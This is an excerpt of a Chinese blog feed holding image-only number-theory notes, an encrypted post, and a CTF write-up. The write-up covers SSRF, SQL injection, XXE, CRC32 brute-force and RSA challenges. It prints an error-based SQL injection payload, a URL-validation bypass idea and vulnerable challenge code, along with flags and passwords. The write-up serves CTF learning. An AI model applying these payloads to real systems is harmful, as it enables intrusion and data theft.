src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401222233184.png" alt></p><h4 id="0x-05-算术基本定理与素数定理"><a href="#0x-05-算术基本定理与素数定理" class="headerlink" title="0x 05 算术基本定理与素数定理"></a>0x 05 算术基本定理与素数定理</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401193511202.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401222410868.png" alt></p><h3 id="第二章-同余"><a href="#第二章-同余" class="headerlink" title="第二章 同余"></a>第二章 同余</h3><h4 id="0x-01-同余的基本概念和性质"><a href="#0x-01-同余的基本概念和性质" class="headerlink" title="0x 01 同余的基本概念和性质"></a>0x 01 同余的基本概念和性质</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403222304291.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403224812594.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403224939302.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403225013389.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403225117248.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403225331985.png" alt></p><h4 id="0x-02-剩余类与完全剩余"><a href="#0x-02-剩余类与完全剩余" class="headerlink" title="0x 02 剩余类与完全剩余"></a>0x 02 剩余类与完全剩余</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404225247817.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404225914840.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404230300776.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404232810037.png" alt></p><h4 id="0x-03-简化剩余系与欧拉函数"><a href="#0x-03-简化剩余系与欧拉函数" class="headerlink" title="0x 03 简化剩余系与欧拉函数"></a>0x 03 简化剩余系与欧拉函数</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404233701768.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200406100107582.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200406204153855.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200406204246058.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200406204313339.png" alt></p><h4 id="0x-04-欧拉定理"><a href="#0x-04-欧拉定理" class="headerlink" title="0x 04 欧拉定理"></a>0x 04 欧拉定理</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;第一章-整数的可除性&quot;&gt;&lt;a href=&quot;#第一章-整数的可除性&quot; class=&quot;headerlink&quot; title=&quot;第一章 整数的可除性&quot;&gt;&lt;/a&gt;第一章 整数的可除性&lt;/h3&gt;&lt;h4 id=&quot;0x-01-广义欧几里得除法-求最大公因数&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
      <category term="knowledge" scheme="http://yoursite.com/categories/knowledge/"/>
    
    
      <category term="信安数基" scheme="http://yoursite.com/tags/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA/"/>
    
  </entry>
  
  <entry>
    <title>YCTF-共克时艰.停课不停赛题解</title>
    <link href="http://yoursite.com/2020/03/27/YCTF-%E5%85%B1%E5%85%8B%E6%97%B6%E8%89%B0-%E5%81%9C%E8%AF%BE%E4%B8%8D%E5%81%9C%E8%B5%9B%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/03/27/YCTF-%E5%85%B1%E5%85%8B%E6%97%B6%E8%89%B0-%E5%81%9C%E8%AF%BE%E4%B8%8D%E5%81%9C%E8%B5%9B%E9%A2%98%E8%A7%A3/</id>
    <published>2020-03-27T13:15:56.000Z</published>
    <updated>2020-03-27T14:02:12.187Z</updated>
    
    <content type="html"><![CDATA[<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x-01-rce-nopar"><a href="#0x-01-rce-nopar" class="headerlink" title="0x 01 rce nopar"></a>0x 01 rce nopar</h4><ul><li><p>考点</p><p>无参数rce</p></li><li><p>解题步骤</p></li></ul><p>根据代码审计得知是无参数rce，用session读文件</p><p>​        <img src="https://uploader.shimo.im/f/5MzRLiUyqO0eMMsW.png!thumbnail" alt="img">      </p><h4 id="0x-02-SSRF"><a href="#0x-02-SSRF" class="headerlink" title="0x 02 SSRF"></a>0x 02 SSRF</h4><ul><li><p>考点</p><p>SSRF</p></li><li><p>解题过程</p></li></ul><ol><li>首先用base64二次编码读源码      <img src="https://uploader.shimo.im/f/zDj6k19gpNgYKm92.png!thumbnail" alt="img">      </li></ol><p>index.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">if(! isset($_GET[&#39;file&#39;]))</span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?file&#x3D;WTNSbWFXMWhaMlV1YW5Cbg&#x3D;&#x3D;&#39;);</span><br><span class="line">$file &#x3D; base64_decode(base64_decode($_GET[&#39;file&#39;]));</span><br><span class="line">echo &#39;&lt;title&gt;&#39;.$_GET[&#39;file&#39;].&#39;&lt;&#x2F;title&gt;&#39;;</span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;,&quot;&quot;, $file);</span><br><span class="line">echo &#39;input_filename:   &#39;. $file.&#39;&lt;&#x2F;br&gt;&#39;;</span><br><span class="line">$file &#x3D; str_replace(&quot;ctf&quot;,&quot;flag&quot;, $file);</span><br><span class="line">echo &#39;real_filename:   &#39;.$file.&#39;&lt;&#x2F;br&gt;&#39;;</span><br><span class="line">$txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line"> </span><br><span class="line">echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot;.$txt.&quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">&#x2F;*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"> * Hint: hal0flagi5here.php</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure><p>读取hal0flagi5here.php代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$argv[1]&#x3D;$_GET[&#39;url&#39;];</span><br><span class="line">if(filter_var($argv[1],FILTER_VALIDATE_URL))</span><br><span class="line">&#123;</span><br><span class="line">$r &#x3D; parse_url($argv[1]);</span><br><span class="line">print_r($r);</span><br><span class="line">if(preg_match(&#39;&#x2F;happyctf\.com$&#x2F;&#39;,$r[&#39;host&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">$url&#x3D;file_get_contents($argv[1]);</span><br><span class="line">echo($url);</span><br><span class="line">&#125;else</span><br><span class="line">&#123;</span><br><span class="line">echo(&quot;error&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;403 Forbidden&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>利用0://绕过filter_var($argv[1],FILTER_VALIDATE_URL)然后目录穿越即可        <img src="https://uploader.shimo.im/f/G7Qe2Bk3DI4WI1ui.png!thumbnail" alt="img">               <img src="https://uploader.shimo.im/f/6CT03lROCWoVlN3F.png!thumbnail" alt="img">      </p><h4 id="0x-03-WEB3-SQLI"><a href="#0x-03-WEB3-SQLI" class="headerlink" title="0x 03 WEB3-SQLI"></a>0x 03 WEB3-SQLI</h4><ul><li><p>考点</p><p>二次注入+报错注入</p></li><li><p>解题过程</p></li></ul><p>注册这边邮箱存在waf,不能存在@符号，直接置空就行</p><p>paylod：<code>test&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#</code></p><p>得到数据表</p><p><img src="https://uploader.shimo.im/f/JIfGTqEETasaqGhS.png!thumbnail" alt="img"></p><p>查询flag表的flag字段（TABLENAME:flag   columnname:flag）      <img src="https://uploader.shimo.im/f/DA0O3EtilM4Z101y.png!thumbnail" alt="img">      </p><h3 id="0x-04-XXE"><a href="#0x-04-XXE" class="headerlink" title="0x 04 XXE"></a>0x 04 XXE</h3><ul><li><p>考点</p><p>xxe</p></li><li><p>解题过程</p></li></ul><p>1.下载泄露的文件得到源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_POST[&quot;submit&quot;])) &#123;</span><br><span class="line">    $target_file &#x3D; getcwd().&quot;&#x2F;upload&#x2F;&quot;.md5($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);</span><br><span class="line">    if (move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $target_file)) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            $result &#x3D; @file_get_contents(&quot;zip:&#x2F;&#x2F;&quot;.$target_file.&quot;#docProps&#x2F;core.xml&quot;);</span><br><span class="line">            $xml &#x3D; new SimpleXMLElement($result, LIBXML_NOENT);</span><br><span class="line">            $xml-&gt;registerXPathNamespace(&quot;dc&quot;, &quot;http:&#x2F;&#x2F;purl.org&#x2F;dc&#x2F;elements&#x2F;1.1&#x2F;&quot;);</span><br><span class="line">            foreach($xml-&gt;xpath(&#39;&#x2F;&#x2F;dc:title&#39;) as $title)&#123;</span><br><span class="line">                echo &quot;Title &#39;&quot;.$title . &quot;&#39; has been added.&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception $e)&#123;</span><br><span class="line">            echo $e;</span><br><span class="line">            echo &quot;上传文件不是一个docx文档.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;上传失败.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解法参考：<a href="https://www.jianshu.com/p/40d6d0e7117f" target="_blank" rel="noopener">https://www.jianshu.com/p/40d6d0e7117f</a></p><p>将sample,docx解压，修改docProps/core.xml然后再压缩改后缀上传得到flag</p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x-01-XOR"><a href="#0x-01-XOR" class="headerlink" title="0x 01 XOR"></a>0x 01 XOR</h4><p>赛后群里的师傅给了博客参考：</p><p><a href="https://shawroot.hatenablog.com/entry/2019/11/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccrypto%3Acr2-many-time-secrets" target="_blank" rel="noopener">https://shawroot.hatenablog.com/entry/2019/11/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ccrypto%3Acr2-many-time-secrets</a></p><h4 id="0x-02-Misc2"><a href="#0x-02-Misc2" class="headerlink" title="0x 02 Misc2"></a>0x 02 <strong>Misc2</strong></h4><p>题目给了一个disk3，用file查一下，是Linux etx3，我们创个文件夹挂载        <img src="https://uploader.shimo.im/f/6uoNXvttnOI2XrtW.png!thumbnail" alt="img">      里面有一个readme和一个压缩包，里面有加密的flag.pngreadme说密码被删除了        <img src="https://uploader.shimo.im/f/aOrCmKlkEgA9xLV8.png!thumbnail" alt="img">      </p><p>用DiskGenius工具恢复一下文件得到压缩包密码don0tgu355p@sswd，最后这个png文件改一下高度，得到flag</p><p><img src="/2020/03/27/YCTF-%E5%85%B1%E5%85%8B%E6%97%B6%E8%89%B0-%E5%81%9C%E8%AF%BE%E4%B8%8D%E5%81%9C%E8%B5%9B%E9%A2%98%E8%A7%A3/E:%5CHexo-Blog%5Csource_posts%5CYCTF-%E5%85%B1%E5%85%8B%E6%97%B6%E8%89%B0-%E5%81%9C%E8%AF%BE%E4%B8%8D%E5%81%9C%E8%B5%9B%E9%A2%98%E8%A7%A3%5Cimage-20200327215149221.png" alt="image-20200327215149221"></p><h4 id="0x-03-Keyboard"><a href="#0x-03-Keyboard" class="headerlink" title="0x 03 Keyboard"></a>0x 03 Keyboard</h4><p>参考：<a href="https://www.cnblogs.com/cnnnnnn/p/11939107.html原题" target="_blank" rel="noopener">https://www.cnblogs.com/cnnnnnn/p/11939107.html原题</a></p><h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="0x-01-签到"><a href="#0x-01-签到" class="headerlink" title="0x 01 签到"></a>0x 01 签到</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag.en -inkey rsa_private_key.pem -out flag.txt</span><br><span class="line">flag&#123;We1c0meCtf3r_elab&#125;</span><br></pre></td></tr></table></figure><h4 id="0x-02-CRC32"><a href="#0x-02-CRC32" class="headerlink" title="0x 02 CRC32"></a>0x 02 CRC32</h4><p>CRC32爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">crcs &#x3D; set([0x308E1D5B,0x5194C2D0,0x5C48F6CA])</span><br><span class="line"></span><br><span class="line">def crackfour():</span><br><span class="line">    r &#x3D; xrange(32, 127)</span><br><span class="line">    for a in r:</span><br><span class="line">        for b in r:</span><br><span class="line">         for c in r:</span><br><span class="line">            for d in r:</span><br><span class="line">               txt &#x3D; chr(a)+chr(b)+chr(c)+chr(d)</span><br><span class="line">               crc &#x3D; binascii.crc32(txt)</span><br><span class="line">               if (crc &amp; 0xFFFFFFFF) in crcs:</span><br><span class="line">                  print txt</span><br><span class="line">crackfour()</span><br></pre></td></tr></table></figure><p>得到压缩包密码是64p2@sworD20，解压得到flag</p><h4 id="0x-03-RSABackDoor"><a href="#0x-03-RSABackDoor" class="headerlink" title="0x 03 RSABackDoor"></a>0x 03 RSABackDoor</h4><p>原题，参考<a href="https://xz.aliyun.com/t/6703" target="_blank" rel="noopener">https://xz.aliyun.com/t/6703</a></p><p>得到flag{4e8954396d69c8daaf849655cee3dc9bd6486a0e}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h3&gt;&lt;h4 id=&quot;0x-01-rce-nopar&quot;&gt;&lt;a href=&quot;#0x-01-rce-nopar&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="YCTF" scheme="http://yoursite.com/tags/YCTF/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化笔记</title>
    <link href="http://yoursite.com/2020/03/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/03/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B0/</id>
    <published>2020-03-26T02:03:23.000Z</published>
    <updated>2020-03-26T07:48:41.709Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="c9134ea72c60128701d2ce8f96f3776445ab3f63afa2070ce24f1aa8728c0830">69d9c72eaa9dc2ef5a7cca7638440efb410a752a87c7f0be4f48f7f81e4830d3772313dc771b019b249def7848b1cbda0879a12477a14fa29bb7a29dac44202d6a7b78d405229c2c68750236b5ad8d5ae76eeaf29995708acd785ec0229f04b053f937370c50a4a6d7a7a9b5b6fe108c31a584f7a20b075c9def1dbbadd858297e34fb886ede4e35bccfd43d7bfb34d0ba4932df1ca39a18a2eb710e879c10d266329d155f2cc63f81943230bc80fe0b041bf546e30d5fced70dfc469abe248298f42870000319a61d8fe1e8c5705cc46a1ff4e8bc535a887d8dc490b708c8fafbf1f3a2b0d3d7eec0e9e6d3d00bb1727ef2c4fe1550dd531c3bdeedae49582fd2251e6fd62d994ed617ca76a03f0cd372a1df3184e36dd525088115e22fc7f55c142b53c7940931f890f803f35604beda27e0e913b74586337d59cd4693389b900d98dee20e8cf4a93ad1536922ee5406016a3d71f94287d2dd59fac937903d1d1884f463d14b387a0615dbf085731d9554e3808cb9e553eb2ceaec0980e0b582be00c1d60334a4a6d79f8d90824e62afa2b6e89d82b64d3b3e82cad9062f7b168acce0d0ff3947905643bd8aaf21848d42822a9082f3853c7f8d5c4aa5e78223f0258791df970be6e9984acbe7d6b2fff2067686525a874ad97acb21724760b3fa79a3fbf2d5451278448dd2d1805f95aa81099c192b59772404147574167261fb42043c58a39e6e91b4718aad516d735aba1b3b2b8c9e15960a1de30f80876e7562f5aaa0ac1261cd201c31198988e7ca9faa10789c870f8089a551392354c926ddb52e6339797cff285a212c87629eb505c8ca0b73b1d23b9f3cfc5f45d4e8587e3a1f849c61ed7ab62c0cf44c6c6011cd4b06fd019cab3d04984c4908a2e13a66d1e9288fb3d7b08b2661cd5b07a3e21a2a8a75f8ba63cebb842d7b88c1d59fe5b601d888a542a8187508f5834e54dcf0488e000b92ca8babeac0635721039b1c2f48c086bf3b7c74e4d4a0517adaf0782dc89d4a510e42bc7558dded455d26c29c21436997ffc168b3346413f513d24ed2be30aad5a855c65b0d4a6bc8ca3343530c0017b6c71d8aa44552fed20f6424149d69912cd86f6fde4658afe03d9307d8251702a0021a0a5e6b1a4a24ee6c638038bad5c5aa61f2a88aefaab60f3b0fbc71edb0340e0589b87efefde282cd4ef75ff655403fec5dbe7388394dd32f88c24ddef89bdb95e84c5b1fa964b5cf5c4f3e7fdebea448137192bfbf154878c5831b66f3db60c867dd5e7bc7d81ede48700804b0957a45f3f11bb0ace970290767b49d4e73bc18dad472a15ad0ab53adfd88054a3330e983643c37a8bd48eac58ad0c76f6c1f02088d0030d69df2d079ef9bc5855bb76d63f8e2a414b87391a353e90c05f25f2e6b9d629d1eda897d389242fe0d6f2e1ac88b14fc74a4b1225c276d61d451143678fac8bbb0417e9bd70fe69ff688d5c0d7d347a6a0ebdf2d09a7746280987be52a6f44723eacb12a82fe32d1d5bc1dd61ab5d61e8990bc882fc02efdbda0d9a9525e8f317f5f66126178c959768cb0433a5dd9ba327ad318ba9e2a293854f18d31c71dc8046cec79b796e597584d6b84bff7a458d0c1236a2c151fadd2878dbc03bb521bc0610dd1a25653539d0f01cb040a0a64fdf205a754a551802e952823b59d1cb7299a576730039bc028a4f2a52d8434554986b1b60500167e8ad30f62c0f0188a5ba0c6e0004e642d582b7c7259e001ab3a6a2ea07f367a9497baa435669d9a471a4f29c1afc5576535bdf05e0cca9206e8f02be40674cc66bf6156375b58eaccfa64298df22fed605a8612f5ebc56f2531494af711e0b2c6ec65408314a5bd73e45dcff23bc7217104148400f568e5c110d12afd3d4ec2581710cd5bd18e7a4c64753a99a930e29e5c64fcff7928de65f61f49912c1ec1821e3d434feac2750cd0986865d8e55e18fe2dd56ee9ff4440551685f8123440b1aa3d51361be5df0579671d959cd486e4de9bbe380926e85c3f9eff57a6b66432c4ebd120b6a005998af97250f74ed654a1ce691a4885ff2bed60f17cea25cef71d7b129c4c75940066b0c5b03d0de8339ba4e7abeacf555dddc2d3d836136ef5cef9e83f8957b0ea76033d11c56d330f64615ef87606677397664362b36044696f1f6a2ea50b97ceee08d47b2c01e2930e5826f1186043bc756e0a342b0bde280d3b52e8f296dcb7081d0689d97bd2ba0310e4374252dd872bd01b91f647acaa21a632f679590e116860e618aa32a527e043a4ac24f670fde79e1a8bac4f857886f71b68df6b40c5835422413f886a7d31b508cfdbef022a02e16c40d0e47fed0d876c31fb479bb173888ab4eefed72e44c3accf15af90427e91c0f01d77f006a6e97f8768050e1d56a56d61fde23edbc47930405678c0f3a6c7897b349c99d2abf91d3efa556c5796795a362449528554b21364bd8c6b23c9bdb29751857015ffde4693be4597aa6fb1fa660d0d78ab2a330275aad380a15756b9700b18e8f3fad68bc3a84b7dd0ef8a742aab67971df225a14c1ba13b9bf1882d62ed242296c1b92e67fba930924e62a428dff843ac7aaac466d9e88d714b0439cd16002a5f1c2f3575e0b5dbadf7593c8faa250e82e385cf9c95f2d946d06b6be98e6b090080fce268d479ab087ab6b300bb2f8023b8bb9a17f2eae98d82478dd745f61dada042901de2b82008c55b5dab464cf3a8556e7f4586c58a5cb20a0989313588e9e8d901c778e7e3cab9ef6da3ec0f3af2d869eb884ed18193e071543650a4b3c539b41bb91b648fe9cd7eaeeb3515120908b56baa61a888eb91be8ad77ec90b7c0c43b95fe9fb85412dd04e16f3806e00c2add9040926d4c15e62b7135298b3bed96db37e40e073f80b96fe2c02b72d6d6efc169b3cdced4743f2fe2c5e8e1c9a8ecb584f11982412958a852038581a8ed045b311c9a2a391b0762b1f73dccb0414b5a080bb4c3548cfe6008103e43a3c661c29b01d6efb1a70a344c75522595d4e19e3af213d4b456eafbb37244a0ae10d93b6f19f6b5c66c175f15cbe750d0e35c8592dca8773b954992db316ad48727eab16f61a276666f735d8945f774d23e5e37d4414bbbdbf4f89a56cfcc4b666a1a501410d44aeb2cee82e675e2b9f1b05993264e7c041ea3e409f50ad9edf2e749f857df24274741407bce9729498228b5b7b022744da6575c49103553f6a347ad6190f6af0524907c702b924d14596d7e0aabfe0020b4df7f1e93ec465dbb019582ede72bc36d3f16de2b321541d32b6d2e6ba9d1f926cc5305ecfed76f0c9661ce934f0d02ec74379c36ab9fa4c3bb704c0c3a4f622d64661366baa7ae707df50404b1140213455d4f774bb6bb55fa6d39eadc30c61b2a7c6e98c6a81fca83fae33a6bcc1b0e971a1577e80df35b89407de685bc27faeccfe54dbbef07f36b7b6d2e1f97981d5baaa7a4daaef2f00d4995c4e0293bed5df7949c12b636284e57b49b2ac019cba371703782bff7097ef67458353ba30e9916fadcc121a614ca11555d2f1e800ee0f134bebe3b24f9ddc60b0dd132faf2e8c4e16b7d02ec50f7d1baae0cf429b9f42ede0b438ccd3b142601a2848908c22462959aee8c87bcc8968e5d8c856c2e2c728ee6fc01dcc0b82898443cfffc0ea315799c612626e6bc23f0ca3c448b0015eaaecd20bba5542b13cf70ec9c6f07ee2b6ad48431e69d8e5aa719e1dec3a471f3f545c16764bf114d6ae0a202c1cb81cdc6e6578aef0017c1ded5c627f76932acdb7d2c72b4fd8d9e35efe4f337c3450d1082459a5e20992853951fbd2d0c4fcb6e60573280d6622959676c3057f23e6e93b9bd990653c2ac2144f568bf69bef4f997553b09dbdd9a8cd2cace52d9b613e22616e2c695d1fb878de6776a8d6e09322761cd5bb51b582226dd07dd59cf33fa4962d8459ba02cb270835205a3ca9f16e6ef886e2d0ec865635e987a643561a8bcad07acf416035de934211ddbcdadfe28996bb18386930baeddb585ef659a809bdfda08166b934962ad9d29e4355bd855b12c2c8f72e43a7702899be5010da81da61338b8a77326965468488691ef5e45a68cf433878ecea5fd327c4d2fb53d70a26ad7b8cc3a51da875c0a3168c211b82c9da56384b0ff4399ca410644950e8e2267f570318ae46200e4e934b50a6744dd3d46e852785749d2960120d6e2dc8ed2593312e1de972fa9ba0cbf7b485e0d7a617b16fa20a510ca53eabf2d5472f38036e825f2be7f3b4abed3fe1b5281162fe69e02acf908fe2e0bcd0aa871f6acfecd202541d9f998548eca135632d3b2c9faf92926b017a431770c393da5f322c216965d060d743aa4c6321443f64d66c2556ca2c54fa0cdb665d21cf11bc59293482e3c638caa59d6e132f0ab86087566be1a8bcf8f2592841f954d7408b2bc2aadbcebc9efe49fa19d01a80be197988cad8356a7740639ba4c467e87edaa26083455e3a1072f885f817976ebcf8b688ddbba63022b5d257653b20a2b4b1c4bcf67f221d066d2f7c1c8300d9cb3536b4c57630d68097ce42ef000e923a3e8ac2e27685d77fdbbf49015879b1b6205926d6635fa94958ef7c46660de9383d76599a37805b936da1958e7e744e4013e37966b36b9fa2f0fb8c6f9c29566995be7bfa9d213f9f27d009e1fa0cd2d7a5031cfea852086789a334e2bec188005ca3393d5da3139283d9559f021a9309660180c20ccd8ccf66ff6d7edcf8178cc9d7b98169645e689689608f4d948d8ad25b962dfe304c9ed4e7f6dc794be7393d4a93f2897cf3ce7167a40ae645cd913307c63b795cbaa1aa9dc71bd09840441428ef95839e8c84963db6406a1ec7d3351412500f8a79063b39ed36622fff29574cd29ec104a6ae4816b01d1198face08324ea083f36d506ae5a1eb86004d7b38444105e0e0657acbccea8214292683887a03a689b0275b7ace8bfd890a06e763659d31d3f06f453a81b962ad33e58a2802c1efd49d5a2e3e89335dc41b7a972fc57338eb3f12314f1ebd171f1729592a9ee8